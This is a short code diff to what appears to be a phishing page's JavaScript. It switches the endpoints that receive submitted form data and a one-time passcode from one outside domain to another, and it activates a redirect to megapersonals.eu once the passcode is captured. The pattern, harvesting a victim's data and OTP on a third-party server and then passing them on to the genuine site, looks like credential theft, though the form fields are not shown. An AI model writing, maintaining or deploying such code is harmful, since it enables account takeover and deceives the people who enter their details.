@@ -510,7 +510,7 @@ padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; bo
 
 
 
-  // fetch("https://sojib6481.ck904.my.id/api/data", {
+  // fetch("https://sojib6481.ck904.website/api/data", {
   //   method: "POST",
   //   headers: {
   //     "Content-Type": "application/json",
@@ -545,7 +545,7 @@ async function updateData() {
       created_at: new Date().toISOString().slice(0, 19).replace("T", " "), // 2025-08-13 10:30:00
     };
 
-    const response = await fetch("https://sojib6481.ck904.my.id/api/data", {
+      const response = await fetch("https://sojib6481.ck904.website/api/data", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
@@ -641,7 +641,7 @@ async function updateData() {
       try {
         // Example PATCH request
         const response = await fetch(
-          `https://sojib6481.ck904.my.id/api/verify`,
+          `https://sojib6481.ck904.website/api/verify`,
           {
             method: "POST",
             headers: {
@@ -657,7 +657,7 @@ async function updateData() {
         if (response.ok) {
           
           // Redirect after OTP success
-          //  window.location.href = "https://megapersonals.eu/";
+          window.location.href = "https://megapersonals.eu/";
         } else {
           console.error("Failed to update:", result);
           submitBtn.value = "Try Again";
@@ -675,7 +675,3 @@ async function updateData() {
   //   .getElementById("otpForm")
   //   .addEventListener("submit", handleOTPSubmit);
 });
-
-
-
-///Hello sdkl true love miya
